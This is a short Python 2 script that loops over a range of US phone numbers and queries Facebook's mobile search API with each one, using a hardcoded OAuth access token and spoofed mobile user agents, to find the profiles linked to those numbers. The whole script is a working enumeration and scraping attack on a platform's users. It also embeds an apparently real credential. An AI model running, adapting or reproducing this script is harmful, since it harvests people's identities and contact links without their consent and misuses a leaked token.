import fbchat
import requests
import random
def DumpCellPhoneFB(areacode= 818,start=0000,end=9999):
    phone_range = [651, 200, 203 , 802 , 815,726,370, 434,383,636,602,689,414]
    first_three = random.choice(phone_range)

    opcion = int(0)
    code = '+1'
    print "ingrese un rango valido eje: desde: 999999111 hasta: 999999222"
    a = int(str(areacode)+str(first_three)+str(start).zfill(4))
    b = int(str(areacode)+str(first_three)+str(end).zfill(4))
    while a<b:
        phone = str(a)


        USERAGENT='[FBAN/FB4A;FBAV/36.0.0.39.166;FBBV/11877499;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FB_FW/2;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G890A;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
        user_agent = ",'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/FBIOS;FBAV/15.0.0.16.28;FBBV/4463064;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/FBID/phone;FBLC/en_US;FBOP/5]'"
        header = {'Authorization':'OAuth EAAAAUaZA8jlABAJr3PfZBkzwWoFlyOoUMHzyZC3ZCyLZA64JB0XdZCJqUQJpDmeRnzOZAe9dTM72G5ZBZCijNexZAdvzCI9OZBLw585q5K441tvc5C47TB4ZAPlDWz2cpjurOCfZCJXZBUSSghLqoBOquhDVGjruFJvcd0bonxHywhqngrSgZDZD','User-Agent':user_agent}
        url = 'https://api.facebook.com/method/ubersearch.get?include_native_ios_url=true&support_groups_icons=true&group_icon_scale=2&context=mobile_search_ios&limit=10&locale=en_US&sdk_version=3&photo_size=64&filter=%5B%27user%27%2C%27page%27%2C%27group%27%2C%27event%27%2C%27app%27%2C%27hashtag_exact%27%2C%20%27shortcut%27%5D&query='+phone+'&fb_api_caller_class=FBSimpleSearchTypeaheadRequest&sdk=ios&fb_api_req_friendly_name=ubersearch&include_is_verified=true&uuid=C67598DE-22BA-443C-AE71-E6693BE8FE9E&app_version=4463064&format=json'
        r = requests.get(url, headers = header)
        print r.text
        a = a+1
DumpCellPhoneFB()
